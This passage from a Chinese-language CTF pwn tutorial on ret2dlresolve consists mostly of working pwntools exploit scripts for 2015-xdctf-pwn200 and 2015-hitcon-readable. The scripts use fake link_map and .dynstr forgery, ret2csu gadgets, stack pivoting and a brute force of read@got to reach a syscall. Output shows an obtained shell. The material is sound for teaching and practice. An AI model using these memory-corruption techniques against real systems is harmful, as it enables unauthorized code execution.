<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span> <span class=mi>0</span><span class=p>,</span> <span class=n>fake_linkmap_addr</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>link_map</span><span class=p>)))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>vuln_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=k>assert</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span> <span class=o>&lt;=</span> <span class=mi>256</span><span class=p>)</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=c1># send linkmap</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>link_map</span><span class=p>)</span>

<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
<span class=c1>#0x00000000004007a1: pop rsi; pop r15; ret; </span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x00000000004007a1</span><span class=p>)</span>  <span class=c1># stack align 16 bytes</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x00000000004007a3</span><span class=p>)</span>  <span class=c1># 0x00000000004007a3: pop rdi; ret;</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>fake_linkmap_addr</span> <span class=o>+</span> <span class=mh>0x48</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>resolve_call</span><span class=p>)</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>最終執行結果</p> <div class=highlight><pre><span></span><code>❯<span class=w> </span>python<span class=w> </span>exp-fake-linkmap.py
<span class=o>[</span>+<span class=o>]</span><span class=w> </span>Starting<span class=w> </span><span class=nb>local</span><span class=w> </span>process<span class=w> </span><span class=s1>&#39;./main_partial_relro_64&#39;</span>:<span class=w> </span>pid<span class=w> </span><span class=m>51197</span>
<span class=o>[</span>*<span class=o>]</span><span class=w> </span><span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64&#39;</span>
<span class=w>    </span>Arch:<span class=w>     </span>amd64-64-little
<span class=w>    </span>RELRO:<span class=w>    </span>Partial<span class=w> </span>RELRO
<span class=w>    </span>Stack:<span class=w>    </span>No<span class=w> </span>canary<span class=w> </span>found
<span class=w>    </span>NX:<span class=w>       </span>NX<span class=w> </span>enabled
<span class=w>    </span>PIE:<span class=w>      </span>No<span class=w> </span>PIE<span class=w> </span><span class=o>(</span>0x400000<span class=o>)</span>
<span class=o>[</span>*<span class=o>]</span><span class=w> </span>running<span class=w> </span><span class=k>in</span><span class=w> </span>new<span class=w> </span>terminal:<span class=w> </span>/usr/bin/gdb<span class=w> </span>-q<span class=w>  </span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=w> </span><span class=m>51197</span>
<span class=o>[</span>-<span class=o>]</span><span class=w> </span>Waiting<span class=w> </span><span class=k>for</span><span class=w> </span>debugger:<span class=w> </span>debugger<span class=w> </span>exited!<span class=w> </span><span class=o>(</span>maybe<span class=w> </span>check<span class=w> </span>/proc/sys/kernel/yama/ptrace_scope<span class=o>)</span>
<span class=o>[</span>*<span class=o>]</span><span class=w> </span>Loaded<span class=w> </span><span class=m>14</span><span class=w> </span>cached<span class=w> </span>gadgets<span class=w> </span><span class=k>for</span><span class=w> </span><span class=s1>&#39;./main_partial_relro_64&#39;</span>
<span class=o>[</span>*<span class=o>]</span><span class=w> </span><span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/libc.so.6&#39;</span>
<span class=w>    </span>Arch:<span class=w>     </span>amd64-64-little
<span class=w>    </span>RELRO:<span class=w>    </span>Partial<span class=w> </span>RELRO
<span class=w>    </span>Stack:<span class=w>    </span>Canary<span class=w> </span>found
<span class=w>    </span>NX:<span class=w>       </span>NX<span class=w> </span>enabled
<span class=w>    </span>PIE:<span class=w>      </span>PIE<span class=w> </span>enabled
<span class=o>[</span>*<span class=o>]</span><span class=w> </span>Switching<span class=w> </span>to<span class=w> </span>interactive<span class=w> </span>mode
$<span class=w> </span>whoami
iromise
</code></pre></div> <p>雖然在這樣的攻擊中，我們不再需要信息泄露，但是我們需要知道目標機器的 libc，更具體的，我們需要知道目標函數和某個已經解析後的函數之間的偏移。</p> <h4 id=_5>基於工具僞造<a class=headerlink href=#_5 title="Permanent link">&para;</a></h4> <p>感興趣的讀者可以自行嘗試使用相關的工具看是否可以攻擊成功。</p> <h3 id=full-relro_1>Full RELRO<a class=headerlink href=#full-relro_1 title="Permanent link">&para;</a></h3> <h2 id=2015-hitcon-readable>2015-hitcon-readable<a class=headerlink href=#2015-hitcon-readable title="Permanent link">&para;</a></h2> <p>檢查一下文件權限，可以發現，該可執行文件只開啓了 NX 保護</p> <div class=highlight><pre><span></span><code>❯<span class=w> </span>checksec<span class=w> </span>readable
<span class=o>[</span>*<span class=o>]</span><span class=w> </span><span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-hitcon-quals-readable/readable&#39;</span>
<span class=w>    </span>Arch:<span class=w>     </span>amd64-64-little
<span class=w>    </span>RELRO:<span class=w>    </span>No<span class=w> </span>RELRO
<span class=w>    </span>Stack:<span class=w>    </span>No<span class=w> </span>canary<span class=w> </span>found
<span class=w>    </span>NX:<span class=w>       </span>NX<span class=w> </span>enabled
<span class=w>    </span>PIE:<span class=w>      </span>No<span class=w> </span>PIE<span class=w> </span><span class=o>(</span>0x400000<span class=o>)</span>
</code></pre></div> <p>也就是說我們其實可以直接修改 dynamic 節的內容。但是，與 2015-xdctf-pwn200 不同，這裏棧溢出只能越界讀取 16 個字節，而上述例子中所使用的的 ret2csu 則需要大量的字節。因此，直接使用該方法是不行了。</p> <p>我們來仔細分析下目前的情況，即我們可以越界控制 rbp、返回地址。考慮到 read 是使用 rbp 來索引 buffer 的</p> <div class=highlight><pre><span></span><code>.text:0000000000400505                 lea     rax, [rbp-10h]
.text:0000000000400509                 mov     edx, 20h ; &#39; &#39;  ; nbytes
.text:000000000040050E                 mov     rsi, rax        ; buf
.text:0000000000400511                 mov     edi, 0          ; fd
.text:0000000000400516                 mov     eax, 0
.text:000000000040051B                 call    _read
.text:0000000000400520                 leave
.text:0000000000400521                 retn
</code></pre></div> <p>那如果我們控制 rbp 爲寫的地址加上 0x10，即 targetaddr+0x10，然後再跳轉到 0x400505，即棧的結構爲</p> <div class=highlight><pre><span></span><code>return_addr -&gt; 0x400505
rbp         -&gt; target addr + 0x10
fake buf
</code></pre></div> <p>那麼我們就可以控制程序在目標地址處寫 16 個字節。通過不斷地這樣操作，我們就可以不斷地讀取 16 個字節，從而達到讀取任意長字節的目的。</p> <h3 id=1modify-dynamic-section>方法1：modify dynamic section<a class=headerlink href=#1modify-dynamic-section title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
<span class=c1># context.log_level=&quot;debug&quot;</span>
<span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&quot;tmux&quot;</span><span class=p>,</span><span class=s2>&quot;splitw&quot;</span><span class=p>,</span><span class=s2>&quot;-h&quot;</span><span class=p>]</span>
<span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s2>&quot;amd64&quot;</span>
<span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;./readable&quot;</span><span class=p>)</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./readable&quot;</span><span class=p>)</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./readable&quot;</span><span class=p>)</span>

<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>
<span class=n>csu_first_addr</span> <span class=o>=</span> <span class=mh>0x40058A</span>
<span class=n>csu_second_addr</span> <span class=o>=</span> <span class=mh>0x400570</span>

<span class=k>def</span><span class=w> </span><span class=nf>csu_gadget</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>func_ptr</span><span class=p>,</span> <span class=n>edi</span><span class=p>,</span> <span class=n>rsi</span><span class=p>,</span> <span class=n>rdx</span><span class=p>):</span>
    <span class=c1># rdx = r13</span>
    <span class=c1># rsi = r14</span>
    <span class=c1># rdi = r15d</span>
    <span class=c1># call [r12+rbx*8]</span>
    <span class=c1># set rbx+1=rbp</span>
    <span class=k>return</span> <span class=n>flat</span><span class=p>([</span><span class=n>csu_first_addr</span><span class=p>,</span> <span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>func_ptr</span><span class=p>,</span> <span class=n>rdx</span><span class=p>,</span>
                    <span class=n>rsi</span><span class=p>,</span> <span class=n>edi</span><span class=p>,</span> <span class=n>csu_second_addr</span><span class=p>],</span> <span class=n>arch</span><span class=o>=</span><span class=s2>&quot;amd64&quot;</span><span class=p>)</span><span class=o>+</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x38</span>

<span class=k>def</span><span class=w> </span><span class=nf>read16bytes</span><span class=p>(</span><span class=n>targetaddr</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>16</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>targetaddr</span><span class=o>+</span><span class=mh>0x10</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x400505</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>content</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>16</span><span class=p>,</span> <span class=s2>&quot;</span><span class=se>\x00</span><span class=s2>&quot;</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x600890</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x400505</span><span class=p>)</span>
    <span class=k>return</span> <span class=n>payload</span>

<span class=c1># stack privot to bss segment, set rsp = new_stack</span>
<span class=n>fake_data_addr</span> <span class=o>=</span> <span class=n>bss_addr</span>
<span class=n>new_stack</span> <span class=o>=</span> <span class=n>bss_addr</span><span class=o>+</span><span class=mh>0x500</span>

<span class=c1># modify .dynstr pointer in .dynamic section to a specific location</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>csu_gadget</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x600778</span><span class=o>+</span><span class=mi>8</span><span class=p>,</span><span class=mi>8</span><span class=p>)</span>
<span class=c1># construct a fake dynstr section</span>
<span class=n>dynstr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynstr&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>data</span><span class=p>()</span>
<span class=n>dynstr</span> <span class=o>=</span> <span class=n>dynstr</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&quot;read&quot;</span><span class=p>,</span><span class=s2>&quot;system&quot;</span><span class=p>)</span>
<span class=n>rop</span> <span class=o>+=</span> <span class=n>csu_gadget</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=n>fake_data_addr</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>dynstr</span><span class=p>))</span>
<span class=c1># read /bin/sh\x00</span>
<span class=n>binsh_addr</span> <span class=o>=</span> <span class=n>fake_data_addr</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>dynstr</span><span class=p>)</span>
<span class=n>rop</span> <span class=o>+=</span> <span class=n>csu_gadget</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=n>binsh_addr</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=s2>&quot;/bin/sh</span><span class=se>\x00</span><span class=s2>&quot;</span><span class=p>))</span>
<span class=c1># 0x0000000000400593: pop rdi; ret; </span>
<span class=n>rop</span> <span class=o>+=</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x0000000000400593</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>binsh_addr</span><span class=p>)</span>
<span class=c1># 0x0000000000400590: pop r14; pop r15; ret; </span>
<span class=n>rop</span> <span class=o>+=</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x0000000000400590</span><span class=p>)</span> <span class=o>+</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>16</span> <span class=c1># stack align</span>
<span class=c1># return to the second instruction of read&#39;plt</span>
<span class=n>rop</span> <span class=o>+=</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x4003E6</span><span class=p>)</span>

<span class=c1># gdb.attach(io)</span>
<span class=c1># pause()</span>
<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=p>),</span><span class=mi>16</span><span class=p>):</span>
    <span class=n>tmp</span> <span class=o>=</span> <span class=n>read16bytes</span><span class=p>(</span><span class=n>new_stack</span><span class=o>+</span><span class=n>i</span><span class=p>,</span><span class=n>rop</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>16</span><span class=p>])</span>
    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>tmp</span><span class=p>)</span>


<span class=c1># jump to the rop</span>
<span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>16</span>
<span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>new_stack</span><span class=o>-</span><span class=mi>8</span><span class=p>)</span>
<span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x400520</span><span class=p>)</span>  <span class=c1># leave ret</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>

<span class=c1># send fake dynstr addr</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=n>fake_data_addr</span><span class=p>))</span>
<span class=c1># send fake dynstr section</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>dynstr</span><span class=p>)</span>
<span class=c1># send &quot;/bin/sh\x00&quot;</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s2>&quot;/bin/sh</span><span class=se>\x00</span><span class=s2>&quot;</span><span class=p>)</span>
<span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <h3 id=2-rop>方法 2 - 標準 ROP<a class=headerlink href=#2-rop title="Permanent link">&para;</a></h3> <p>這個方法比較取巧，考慮到 read 函數很短，而且最後會調用系統調用，因此在 libc 的實現中會使用 syscall 指令，而同時我們可以修改 read 的 got 表，那如果我們把 <a href=mailto:read@got.plt>&#114;&#101;&#97;&#100;&#64;&#103;&#111;&#116;&#46;&#112;&#108;&#116;</a> 修改爲 syscall 的地址，同時佈置好相關的參數，即可執行系統調用。這裏我們控制 ROP 執行<code>execve("/bin/sh",NULL,NULL)</code>。</p> <p>首先，我們需要爆破來尋找 syscall 具體的地址，我們可以考慮調用 write 函數來看是否真正執行了 syscall指令</p> <div class=highlight><pre><span></span><code>def bruteforce():
    rop_addr = elf.bss()
    for i in range(0, 256):
        io = process(&quot;./readable&quot;)
        # modify read&#39;s got
        payload = csu_gadget(0, 1, elf.got[&quot;read&quot;], 1, elf.got[&quot;read&quot;], 0)
        # jump to read again
        # try to write ELF Header to stdout
        payload += csu_gadget(0, 1, elf.got[&quot;read&quot;], 4, 0x400000, 1)
        # gdb.attach(io)
        # pause()
        for j in range(0, len(payload), 16):
            tmp = read16bytes(rop_addr+j, payload[j:j+16])
            io.send(tmp)
        # jump to the rop
        payload = &#39;a&#39;*16
        payload += p64(rop_addr-8)
        payload += p64(0x400520)  # leave ret

        io.send(payload)
        io.send(p8(i))
        try:
            data = io.recv(timeout=0.5)
            if data == &quot;\x7FELF&quot;:
                print(hex(i), data)
        except Exception as e:
            pass
        io.close()
</code></pre></div> <p>即我們控制程序輸出 ELF 文件的頭，如果輸出了，那就說明成功了。此外，這裏我們使用了read 函數的返回值來控制 rax 寄存器的值，以便於控制具體想要執行哪個系統調用。運行結果如下</p> <div class=highlight><pre><span></span><code>❯<span class=w> </span>python<span class=w> </span>exp.py
<span class=o>(</span><span class=s1>&#39;0x8f&#39;</span>,<span class=w> </span><span class=s1>&#39;\x7fELF&#39;</span><span class=o>)</span>
<span class=o>(</span><span class=s1>&#39;0xc2&#39;</span>,<span class=w> </span><span class=s1>&#39;\x7fELF&#39;</span><span class=o>)</span>
</code></pre></div> <p>通過對比 libc.so 確實可以看到，對應的偏移處具有 <code>syscall</code> 指令</p> <div class=highlight><pre><span></span><code>.text:000000000011018F                 syscall                 ; LINUX - sys_read
.text:00000000001101C2                 syscall                 ; LINUX - sys_read
</code></pre></div> <p>libc 的版本爲</p> <div class=highlight><pre><span></span><code>❯ ./libc.so.6
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27.
</code></pre></div> <p>需要注意，不同 libc 的偏移可能不一樣。</p> <p>完整代碼如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
<span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&quot;tmux&quot;</span><span class=p>,</span> <span class=s2>&quot;splitw&quot;</span><span class=p>,</span> <span class=s2>&quot;-h&quot;</span><span class=p>]</span>
<span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;error&#39;</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./readable&quot;</span><span class=p>)</span>
<span class=n>csu_first_addr</span> <span class=o>=</span> <span class=mh>0x40058A</span>
<span class=n>csu_second_addr</span> <span class=o>=</span> <span class=mh>0x400570</span>


<span class=k>def</span><span class=w> </span><span class=nf>read16bytes</span><span class=p>(</span><span class=n>targetaddr</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>16</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>targetaddr</span><span class=o>+</span><span class=mh>0x10</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x400505</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>content</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>16</span><span class=p>,</span> <span class=s2>&quot;</span><span class=se>\x00</span><span class=s2>&quot;</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x600f00</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x400505</span><span class=p>)</span>
    <span class=k>return</span> <span class=n>payload</span>


<span class=k>def</span><span class=w> </span><span class=nf>csu_gadget</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
    <span class=c1># rdx = r13</span>
    <span class=c1># rsi = r14</span>
    <span class=c1># rdi = r15d</span>
    <span class=c1># call [r12+rbx*8]</span>
    <span class=c1># set rbx+1=rbp</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span><span class=n>csu_first_addr</span><span class=p>,</span> <span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span>
                    <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>,</span> <span class=n>csu_second_addr</span><span class=p>],</span> <span class=n>arch</span><span class=o>=</span><span class=s2>&quot;amd64&quot;</span><span class=p>)</span>
    <span class=k>return</span> <span class=n>payload</span>


<span class=k>def</span><span class=w> </span><span class=nf>bruteforce</span><span class=p>():</span>
    <span class=n>rop_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>
    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>256</span><span class=p>):</span>
        <span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;./readable&quot;</span><span class=p>)</span>
        <span class=c1># modify read&#39;s got</span>
        <span class=n>payload</span> <span class=o>=</span> <span class=n>csu_gadget</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&quot;read&quot;</span><span class=p>],</span> <span class=mi>1</span><span class=p>,</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&quot;read&quot;</span><span class=p>],</span> <span class=mi>0</span><span class=p>)</span>
        <span class=c1># jump to read again</span>
        <span class=c1># try to write ELF Header to stdout</span>
        <span class=n>payload</span> <span class=o>+=</span> <span class=n>csu_gadget</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&quot;read&quot;</span><span class=p>],</span> <span class=mi>4</span><span class=p>,</span> <span class=mh>0x400000</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
        <span class=c1># gdb.attach(io)</span>
        <span class=c1># pause()</span>
        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>),</span> <span class=mi>16</span><span class=p>):</span>
            <span class=n>tmp</span> <span class=o>=</span> <span class=n>read16bytes</span><span class=p>(</span><span class=n>rop_addr</span><span class=o>+</span><span class=n>j</span><span class=p>,</span> <span class=n>payload</span><span class=p>[</span><span class=n>j</span><span class=p>:</span><span class=n>j</span><span class=o>+</span><span class=mi>16</span><span class=p>])</span>
            <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>tmp</span><span class=p>)</span>
        <span class=c1># jump to the rop</span>
        <span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>16</span>
        <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rop_addr</span><span class=o>-</span><span class=mi>8</span><span class=p>)</span>
        <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x400520</span><span class=p>)</span>  <span class=c1># leave ret</span>

        <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
        <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p8</span><span class=p>(</span><span class=n>i</span><span class=p>))</span>
        <span class=k>try</span><span class=p>:</span>
            <span class=n>data</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>timeout</span><span class=o>=</span><span class=mf>0.5</span><span class=p>)</span>
            <span class=k>if</span> <span class=n>data</span> <span class=o>==</span> <span class=s2>&quot;</span><span class=se>\x7F</span><span class=s2>ELF&quot;</span><span class=p>:</span>
                <span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>i</span><span class=p>),</span> <span class=n>data</span><span class=p>)</span>
        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
            <span class=k>pass</span>
        <span class=n>io</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>


<span class=k>def</span><span class=w> </span><span class=nf>exp</span><span class=p>():</span>
    <span class=n>rop_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>
    <span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;./readable&quot;</span><span class=p>)</span>
    <span class=n>execve_number</span> <span class=o>=</span> <span class=mi>59</span>
    <span class=n>bin_sh_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&quot;read&quot;</span><span class=p>]</span><span class=o>-</span><span class=n>execve_number</span><span class=o>+</span><span class=mi>1</span>
    <span class=c1># modify the last byte of read&#39;s got</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=n>csu_gadget</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&quot;read&quot;</span><span class=p>],</span> <span class=n>execve_number</span><span class=p>,</span> <span class=n>bin_sh_addr</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
    <span class=c1># jump to read again, execve(&quot;/bin/sh\x00&quot;)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>csu_gadget</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&quot;read&quot;</span><span class=p>],</span>
                          <span class=n>bin_sh_addr</span><span class=o>+</span><span class=mi>8</span><span class=p>,</span> <span class=n>bin_sh_addr</span><span class=o>+</span><span class=mi>8</span><span class=p>,</span> <span class=n>bin_sh_addr</span><span class=p>)</span>
    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>),</span> <span class=mi>16</span><span class=p>):</span>
        <span class=n>tmp</span> <span class=o>=</span> <span class=n>read16bytes</span><span class=p>(</span><span class=n>rop_addr</span><span class=o>+</span><span class=n>j</span><span class=p>,</span> <span class=n>payload</span><span class=p>[</span><span class=n>j</span><span class=p>:</span><span class=n>j</span><span class=o>+</span><span class=mi>16</span><span class=p>])</span>
        <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>tmp</span><span class=p>)</span>
    <span class=c1># jump to the rop</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>16</span>
